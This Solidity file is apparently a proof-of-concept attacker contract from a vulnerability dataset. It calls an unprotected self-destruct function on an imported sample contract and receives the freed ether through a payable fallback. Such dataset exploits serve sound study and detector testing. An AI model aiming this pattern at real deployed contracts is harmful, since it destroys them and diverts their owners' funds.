pragma solidity ^0.4.0;

import "../dataset/access_control/simple_suicide.sol";
contract SimpleSuicideAttacker {
    SimpleSuicide target;

    constructor (address _target) public {
        target = SimpleSuicide(_target);
    }

    function attack() public {
        target.sudicideAnyone();
    }

    function () public payable {
    }
}